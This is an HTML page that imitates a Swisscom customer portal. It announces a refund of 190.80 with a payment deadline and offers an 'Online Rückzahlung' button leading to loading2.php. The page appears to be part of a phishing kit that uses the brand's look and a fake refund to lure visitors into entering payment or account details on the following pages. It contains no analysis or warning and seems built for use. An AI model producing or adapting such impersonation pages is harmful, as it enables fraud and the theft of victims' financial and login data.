
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Swisscom</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/logo.svg" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>
   
   <header class="d-flex justify-content-between align-items-center">
       <div class="logo"><img width="36" height="48" src="image/logo.svg"></div>
       <div class="d-none d-md-block"><img width="1240" src="image/cl.png"></div>
       <div class="res d-block d-md-none"><img width="76" src="image/res.png"></div>
   </header>
   <section class="mt-5">
       <div class="d-block d-md-flex">
           <div class="navv d-none d-md-block">
              <ul class="list-unstyled ms-3">
                  <li><i class="fas fa-home"></i>Home</li>
                  <li><i class="fas fa-gift"></i>Fur Sie</li>
                  <li style="color: #3585E0;"><i class="fas fa-money-bill"></i>Rückerstattung</li>
                  <li><i class="fas fa-bell"></i>Aktivitaten</li>
              </ul>
           </div>
           <div class="form">
               <h2><i style="font-size: 25px;margin-right: 10px;color: #3585E0;" class="fal fa-arrow-left"></i>Rückerstattung</h2>
               <div class="d-flex">
                   <p style="color: #015;font-weight: 700;font-size: 17px;">Juli 2026</p>
               </div>
               <div class="row">
                   <div class="col-md-7">
                       <div class="card">
                           <p  style="color: #015;font-weight: 700;font-size: 17px;margin-bottom: 7px;">Rückerstattungsbetrag</p>
                           <p  style="color: #015;font-weight: 700;font-size: 25px;">190.80</p>
                           <p  style="color: #015;font-weight: 300;">rückzahlbar bis 24.07.2026</p>
                           <a href="loading2.php"><div class="bttn"><button style="font-weight: 300;font-size: 18px;" type="button" class="btn btn-primary">Online Rückzahlung</button></div></a>
                           <a href="loading2.php"><div class="bttn"></div></a>
                       </div>
                   </div>
                   <div class="col-md-5">
                       <div class="card d-flex justify-content-between" style="flex-direction: inherit;">
                           <div><p style="color: #015;font-weight: 700;font-size: 17px;margin-bottom: 7px;margin-bottom: 0;">Nutzungsdetails</p></div>
                           <div><i style="color: #3585E0;" class="fas fa-chevron-right"></i></div>
                       </div>
                       <div class="card d-flex justify-content-between mt-2">
                           <div class="mb-3"><p style="color: #015;font-weight: 700;font-size: 17px;margin-bottom: 7px;margin-bottom: 0;">Dokumente herunterladen</p></div>
                           <ul class="list-unstyled">
                               <li style="color: #3585E0; "><i style="padding-right:10px" class="fas fa-file-pdf"></i>PDE Rückerstattung</li>
                               <li style="color: #3585E0;margin-top: 10px;"><i style="padding-right:10px" class="fas fa-lock"></i>Verbindungsnachweis</li>
                           </ul>
                       </div>
                   </div>
               </div>
               <div class="text-center mt-5">
                   <div><img width="342" src="image/ft.png"></div>
               </div>
           </div>
       </div>
   </section>


  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>
  </script>
</body>
</html>